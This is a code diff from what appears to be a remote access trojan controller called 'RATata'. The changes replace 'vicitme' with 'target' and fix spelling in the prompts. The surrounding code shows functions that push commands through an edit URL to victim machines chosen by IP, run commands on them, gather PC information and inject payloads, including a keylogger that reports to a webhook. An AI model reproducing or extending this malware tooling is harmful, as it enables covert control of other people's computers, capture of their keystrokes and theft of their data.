@@ -155,7 +155,7 @@ def ping(url_edit, url_raw):
     
   requests.post(url_edit, data=json)
 
-  resson = "Waiting for vicitmes to respond..."
+  resson = "Waiting for target to respond..."
   sec = 5
 
   load(resson, sec)
@@ -191,7 +191,7 @@ def stop(vari):
 
 # ===================<< RUN START >>===================
 def run(url_edit, url_raw):
-  ip = input(f"\n {Fore.RED}RATata> inject> ip_adresse>{Fore.RESET} ")
+  ip = input(f"\n {Fore.RED}RATata> inject> ip_adress>{Fore.RESET} ")
   vari = ip
   stop(vari)
 
@@ -209,7 +209,7 @@ def run(url_edit, url_raw):
     "Content": data,
   }
   requests.post(url_edit, data=json)
-  print("\n [!] Waiting for vicitme to download...")
+  print("\n [!] Waiting for target to download...")
   good =  False
   noww = time.time()
   noww += 5
@@ -231,7 +231,7 @@ def run(url_edit, url_raw):
 
 # ===================<< CMD START >>===================
 def cmd(url_edit, url_raw):
-  ip = input(f"\n {Fore.RED}RATata> commande> ip_adresse>{Fore.RESET} ")
+  ip = input(f"\n {Fore.RED}RATata> commande> ip_adress>{Fore.RESET} ")
   vari = ip
   stop(vari)
   print("""
@@ -247,7 +247,7 @@ def cmd(url_edit, url_raw):
   }
   requests.post(url_edit, data=json)
 
-  print("\n [!] Waiting for vicitme to execute...")
+  print("\n [!] Waiting for target to execute...")
   good =  False
   noww = time.time()
   noww += 10
@@ -270,7 +270,7 @@ def cmd(url_edit, url_raw):
 
 # ===================<< INJECT START >>===================
 def inject(url_edit, url_raw, webhook):
-  ip = input(f"\n {Fore.RED}RATata> inject> ip_adresse>{Fore.RESET} ")
+  ip = input(f"\n {Fore.RED}RATata> inject> ip_adress>{Fore.RESET} ")
   vari = ip
   stop(vari)
   print("""
@@ -303,7 +303,7 @@ def inject(url_edit, url_raw, webhook):
     fail = True
 
   if scriptA == "None":
-    print(f" [-] The value of {mlw} is nul")
+    print(f" [-] The value of {mlw} is null")
     fail = True
 
   if fail == True:
@@ -329,7 +329,7 @@ def inject(url_edit, url_raw, webhook):
   }
   requests.post(url_edit, data=json)
 
-  print("\n [!] Waiting for vicitme to execute...")
+  print("\n [!] Waiting for target to execute...")
   good =  False
   noww = time.time()
   noww += 10
@@ -344,7 +344,7 @@ def inject(url_edit, url_raw, webhook):
     elif time.time() > noww:
       good = True
       if mlw == "2":
-        result = "is maby runing the keylogger, check the webhook"
+        result = "is maybe running the keylogger, check the webhook"
       result = "Did not respond"
       print(f"\n {ip} {result}")
     time.sleep(0.5)
@@ -355,7 +355,7 @@ def inject(url_edit, url_raw, webhook):
 
 # ===================<< PC_INFO START >>===================
 def pcinfo(url_edit, url_raw):
-  ip = input(f"\n {Fore.RED}RATata> pcinfo> ip_adresse>{Fore.RESET} ")
+  ip = input(f"\n {Fore.RED}RATata> pcinfo> ip_adress>{Fore.RESET} ")
   vari = ip
   stop(vari)
 
@@ -366,7 +366,7 @@ def pcinfo(url_edit, url_raw):
   }
   requests.post(url_edit, data=json)
 
-  print("\n [!] Waiting for vicitme to information...")
+  print("\n [!] Waiting for target's informations...")
   good =  False
   noww = time.time()
   noww += 5
@@ -420,7 +420,7 @@ def start(verion_server, version_client, version_API, url_edit, url_raw, webhook
         os.system("clear")
     elif choix == "version info": print(vrinfo)
     else:
-      print("""   [-] Invalide commande, use '?' to display help menu""")
+      print("""   [-] Invalid command, use '?' to display the help menu""")
 
 #on ready
 start(verion_server, version_client, version_API, url_edit, url_raw, webhook)
